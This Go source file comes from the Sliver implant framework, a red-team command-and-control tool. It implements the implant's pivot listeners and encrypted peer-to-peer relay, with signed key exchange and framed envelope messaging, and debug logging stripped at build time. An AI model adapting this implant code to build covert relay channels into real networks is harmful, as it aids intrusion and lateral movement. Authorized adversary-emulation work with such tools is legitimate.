package pivots

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"log"
	"net"
	"sync"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

const (
	readBufSize = 1024
)

var (
	ErrFailedWrite       = errors.New("failed to write")
	ErrFailedKeyExchange = errors.New("failed key exchange")

	pivotListeners = &sync.Map{}
	listenerID     = uint32(0)
)

// StartListener - Generic interface to a start listener function
type StartListener func(string) (*PivotListener, error)

// GetListeners - Get a list of active listeners
func GetListeners() []*pb.PivotListener {
	listeners := []*pb.PivotListener{}
	pivotListeners.Range(func(key interface{}, value interface{}) bool {
		listener := value.(*PivotListener)
		listeners = append(listeners, listener.ToProtobuf())
		return true
	})
	return listeners
}

// AddListener - Add a listener
func AddListener(listener *PivotListener) {
	pivotListeners.Store(listener.ID, listener)
}

// StopListener - Stop a pivot listener
func StopListener(id uint32) {
	if listener, ok := pivotListeners.Load(id); ok {
		listener.(*PivotListener).Stop()
	}
}

// PivotPeer - Abstract interface for a pivot peer
type PivotPeer interface {
	ID() int64
	Start() error
	WriteEnvelope(*pb.Envelope) error
	ReadEnvelope() (*pb.Envelope, error)
	Close() error
	RemoteAddress() string
}

// PivotListener - A pivot listener
type PivotListener struct {
	ID          uint32
	Type        pb.PivotType
	Listener    net.Listener
	Pivots      *sync.Map // ID -> PivotPeer
	BindAddress string
}

// ToProtobuf - Get the protobuf version of the pivot listener
func (l *PivotListener) ToProtobuf() *pb.PivotListener {
	return &pb.PivotListener{
		ID:          l.ID,
		Type:        l.Type,
		BindAddress: l.BindAddress,
	}
}

// Stop - Stop the pivot listener
func (l *PivotListener) Stop() {
	// Close all peer connections before closing listener
	l.Pivots.Range(func(key interface{}, value interface{}) bool {
		value.(PivotPeer).Close()
		return true
	})
	l.Pivots = nil
	l.Listener.Close()
}

// PivotClose - Close a pivot connection
func (l *PivotListener) PivotClose(id int64) {
	if p, ok := l.Pivots.Load(id); ok {
		l.Pivots.Delete(id)
		p.(PivotPeer).Close()
	}
}

// ListenerID - Generate a new pivot id
func ListenerID() uint32 {
	listenerID++
	return listenerID
}

// PivotID - Generate a new pivot id
func PivotID() int64 {
	buf := make([]byte, 8)
	rand.Read(buf)
	return int64(binary.LittleEndian.Uint64(buf))
}

// NetConnPivot - A generic Pivot connection via net.Conn
type NetConnPivot struct {
	id            int64
	conn          net.Conn
	readMutex     *sync.Mutex
	writeMutex    *sync.Mutex
	cipherCtx     *cryptography.CipherContext
	readDeadline  time.Duration
	writeDeadline time.Duration
}

// ID - ID of peer pivot
func (p *NetConnPivot) ID() int64 {
	return p.id
}

// Start - Starts the TCP pivot connection handler
func (p *NetConnPivot) Start() error {
	err := p.keyExchange()
	if err != nil {
		p.conn.Close()
		return err
	}
	return nil
}

// keyExchange - Exchange session key with peer, it's important that we DO NOT write
// anything to the socket before we've validated the peer's key is properly signed.
func (p *NetConnPivot) keyExchange() error {
	p.conn.SetReadDeadline(time.Now().Add(tcpPivotReadDeadline))
	peerHelloRaw, err := p.read()
	p.conn.SetReadDeadline(time.Time{})
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("tcp pivot read failure: %s", err)
		// {{end}}
		return ErrFailedKeyExchange
	}
	peerHello := &pb.PivotHello{}
	err = proto.Unmarshal(peerHelloRaw, peerHello)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("tcp pivot unmarshal failure: %s", err)
		// {{end}}
		return ErrFailedKeyExchange
	}
	validPeer := cryptography.MinisignVerify(peerHello.PublicKey, peerHello.PublicKeySignature)
	if !validPeer {
		// {{if .Config.Debug}}
		log.Printf("tcp pivot invalid peer key")
		// {{end}}
		return ErrFailedKeyExchange
	}
	sessionKey := cryptography.RandomKey()
	p.cipherCtx = cryptography.NewCipherContext(sessionKey)
	ciphertext, err := cryptography.ECCEncryptToPeer(peerHello.PublicKey, peerHello.PublicKeySignature, sessionKey[:])
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("tcp pivot encryption failure: %s", err)
		// {{end}}
		return ErrFailedKeyExchange
	}
	publicKeyRaw, _ := base64.RawStdEncoding.DecodeString(cryptography.ECCPublicKey)
	peerResponse, _ := proto.Marshal(&pb.PivotHello{
		PublicKey:          publicKeyRaw,
		PublicKeySignature: cryptography.ECCPublicKeySignature,
		SessionKey:         ciphertext,
	})
	p.conn.SetWriteDeadline(time.Now().Add(tcpPivotWriteDeadline))
	err = p.write(peerResponse)
	p.conn.SetWriteDeadline(time.Time{})
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("tcp pivot write failure: %s", err)
		// {{end}}
		return ErrFailedKeyExchange
	}
	return nil
}

// write - Write a message to the TCP pivot with a length prefix
// it's unlikely we can't write the 4-byte length prefix in one write
// so we fail if we can't, messages may be much longer so we try to
// drain the message buffer if we didn't complete the write
func (p *NetConnPivot) write(message []byte) error {
	p.writeMutex.Lock()
	defer p.writeMutex.Unlock()
	n, err := p.conn.Write(p.lengthOf(message))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error writing message length: %v", err)
		// {{end}}
		return err
	}
	if n != 4 {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error writing message length: %v", err)
		// {{end}}
		return ErrFailedWrite
	}

	total := 0
	for total < len(message) {
		n, err = p.conn.Write(message[total:])
		total += n
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[tcppivot] Error writing message: %v", err)
			// {{end}}
			return err
		}
	}
	return nil
}

func (p *NetConnPivot) read() ([]byte, error) {
	p.readMutex.Lock()
	defer p.readMutex.Unlock()
	dataLengthBuf := make([]byte, 4)
	n, err := p.conn.Read(dataLengthBuf)
	if err != nil || n != 4 {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}

	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
	readBuf := make([]byte, readBufSize)
	dataBuf := []byte{}
	totalRead := 0
	for {
		n, err := p.conn.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("read error: %s\n", err)
			// {{end}}
			return nil, err
		}
	}
	return dataBuf, err
}

func (p *NetConnPivot) lengthOf(message []byte) []byte {
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(message)))
	return dataLengthBuf.Bytes()
}

// writeEnvelope - Write a complete envelope
func (p *NetConnPivot) WriteEnvelope(envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Marshaling error: %s", err)
		// {{end}}
		return err
	}
	data, err = p.cipherCtx.Encrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Encryption error: %s", err)
		// {{end}}
		return err
	}
	return p.write(data)
}

// readEnvelope - Read a complete envelope
func (p *NetConnPivot) ReadEnvelope() (*pb.Envelope, error) {
	data, err := p.read()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error reading message: %v", err)
		// {{end}}
		return nil, err
	}
	data, err = p.cipherCtx.Decrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Decryption error: %s", err)
		// {{end}}
		return nil, err
	}
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(data, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Unmarshal envelope error: %v", err)
		// {{end}}
		return nil, err
	}
	return envelope, nil
}

// RemoteAddress - Remote address of peer
func (p *NetConnPivot) RemoteAddress() string {
	remoteAddr := p.conn.RemoteAddr()
	if remoteAddr != nil {
		return remoteAddr.String()
	}
	return ""
}

// Close - Close connection to peer
func (p *NetConnPivot) Close() error {
	return p.conn.Close()
}
